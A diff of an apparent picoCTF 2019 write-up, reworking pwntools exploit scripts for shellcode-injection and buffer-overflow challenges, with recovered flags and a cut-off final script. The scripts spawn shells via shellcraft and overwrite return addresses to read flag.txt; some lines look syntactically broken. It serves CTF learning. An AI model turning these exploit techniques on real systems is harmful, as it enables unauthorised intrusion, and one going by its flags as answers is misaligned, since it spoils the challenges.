@@ -26,77 +26,177 @@
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='i386'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
 shellcode = asm(shellcraft.sh())
@@ -112,9 +212,12 @@ io.sendline('cat flag.txt')
 print(repr(io.recv())
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*
@@ -140,96 +243,201 @@ finish()
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='i386'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
-padding = '\x90' * 256
+padding = b'\x90' * 256
 shellcode = asm(shellcraft.sh())
 
 payload = padding + shellcode
 
-print(repr(io.recv())
+print(io.recv())
+
 io.sendline(payload)
 
-print(repr(io.recv())
-io.sendline('cat flag.txt')
+print(io.recv())
 
-print(repr(io.recv())
+io.sendline(b'cat flag.txt')
+
+get_flag()
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*
@@ -285,77 +493,177 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='i386'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
 padding = cyclic(cyclic_find('taaa'))
@@ -367,12 +675,15 @@ payload += flag
 print(repr(io.recv())
 io.sendline(payload)
 
-print(repr(io.recv())
+get_flag()
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}*
@@ -408,77 +719,177 @@ finish()
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='i386'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
+            local = True
+            break
+        elif str('debug') in mode:
+            debug = True
+            break
+        elif i == 0:
+            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
+            exit()
+        else:
+            i -= 1
+            log.info('')
+            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
+            log.info(f'Number of retries: {i}')
+            log.info('')
+            log.info('')
+        
+    if debug:
+        io = process(exe)
+        attach_gdb()
+        log.info('')
+        log.info('')
+        log.info('Attaching gdb to running process')
+        log.info(f'gdb script = {script}')
+        log.info('Opening pwndbg...')
+        log.info('')
+        log.info('')
 
     elif remote:
-      context.update(log_level = 'error')
-      s = ssh(host=r_host, user=r_user, password=r_passwd)
-      io = s.process(exe, cwd=r_dir)
-      log.info('Remote variables set:')
-      log.info('Remote host = ', str(r_host))
-      log.info('Remote user = ', str(r_user))
-      log.info('Changing working directory to: ', str(r_dir))
-      log.info('Starting remote exploit...')
+        context.update(log_level = 'info')
+        s = ssh(host=r_host, user=r_user, password=r_passwd)
+        io = s.process(exe, cwd=r_dir)
+        log.info('')
+        log.info('')
+        log.info('Remote variables set:')
+        log.info(f'Remote host = {r_host}')
+        log.info(f'Remote user = {r_user}')
+        log.info(f'Changing working directory to: {r_dir} ')
+        log.info('Starting remote exploit...')
+        log.info('')
+        log.info('')
+
+    elif local:
+        io = process(exe)
+        log.info('Starting local exploit ...')
+        log.info('')
+        log.info('')
 
     else:
-      io = process(exe)
-      log.info('Starting local exploit ...')
+        log.info('Incorrect mode selected. Exiting...  >_< ')
+        exit()  
+ 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Finish()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prints script run time and then closes the running process.#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def finish():
   global end
-  global begin
+  
   end = time.time()
-  print('Time elapsed: ', end - begin)
+  run_time = end - begin
+  io.close()
+  print(f'Time elapsed: {run_time:.2f}')
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
+##############################################################
+#=========================================================== #
+#                    EXPLOIT GOES HERE                       #
+#=========================================================== #
+##############################################################
+
 start()
 
 adding = cyclic(cyclic_find('waab'))           # location of pattern match @ eip
@@ -495,12 +906,16 @@ payload += argu2
 
 print(repr(io.recv())
 io.sendline(payload)
-print(repr(io.recv())
+
+get_flag()
 
 finish()
-#===========================================================
-#                       END OF SCRIPT                      
-#===========================================================
+
+##############################################################
+#============================================================#
+#                       END OF SCRIPT                        #
+#============================================================#
+##############################################################
 ~~~
 
 **Flag:** *picoCTF{arg5_and_r3turn51b106031}*
@@ -521,84 +936,180 @@ finish()
 >> ROP gadget. Calling `main` before the flag function also re-aligns the stack.
 ~~~python
 #!/usr/bin/env python
-
-from pwn import *
-
-#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 from pwn import *
-
-#=========================================================
-#                   SETTING UP VARIABLES
-#=========================================================
+############################################################
+#==========================================================#
+#                   SETTING UP VARIABLES                   #
+#==========================================================#
+############################################################
 
 os ='linux'
-arch ='AMD64'    
+arch ='i386' 
+exe = './vuln'
+script = 'b* main'
 r_host = '2019shell1.picoctf.com'
 r_dir = '/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123'
 r_user = 'User'
 r_passwd = 'Pa$$w0rd'
-# r_port = ''                                            
-exe = './vuln'
-argv = sys.argv
-gdbscript = 'b* main'
+r_port = '1234' 
 s = ''
+local = False
+remote = False
+debug = False
+mode = ''
 io = ''
+data = ''
 begin = ''
 end = ''
-data = ''
+i = ''
 
-                  # Context variables # 
-
-context.log_level = 'info'
+context.log_level = 'debug'
 context.update(os=os, arch=arch)
+#############################################################
+#===========================================================#
+#                   FUNCTION DEFINITIONS                    #
+#===========================================================#
+#############################################################
 
-#==========================================================
-#                   FUNCTION DEFINITIONS
-#==========================================================
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# attach_gdb()                                              #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Attaches gdb to the running process.                      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
 def attach_gdb():
-        gdb.attach(io, gdbscript=gdbscript)
+    gdb.attach(io, gdbscript=script)
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# get_flag()                                                #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Checks output for the 'pico' flag and either prints it or #
+# exits if no data is sent.                                 #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
 
-def start(argv=[], *a, **kw):
+def get_flag():
+    global data
+    global io
+
+    data = io.recv(timeout=5)
+
+    if data == b'':
+        log.info('')
+        log.info('')
+        log.info('Something went wrong, no data received. Exiting... >_<')
+        exit()
+
+    if b'pico' in data:
+        log.info('')
+        log.info('')
+        log.info(f"Pwned! Here's your flag: {data}")
+        log.info('')
+        log.info('')
+
+    io.close()
+    
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Start()                                                   #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+# Prompts for the startup mode (local, remote, debug) and   #
+# sets the appropriate variables and startup assignemnts.   #
+# loops 3 times for input if not entered in correctly.      #
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def start():
+    global local
+    global remote
+    global debug
     global begin
-    global exe
+    global mode
     global io
     global s
+
+    i = 3
+
     begin = time.time()
-    if gdb:
-      io = process(exe)
-      context.update(log_level = 'debug')
-      attach_gdb()
-      log.info('Setting log level to %s', str(context.log_level))
-      log.info('Attaching gdb to running process')
-      log.info('gdb script = %s', str(gdbscript))
-      log.info('Starting debug exploit...')
+    
+    while i != 0:
+        print('')
+        mode = input('Start exploit in local, remote or debug mode? ')
+        print('')
+        if str('remote') in mode:
+            remote = True
+            break
+        elif str('local') in mode:
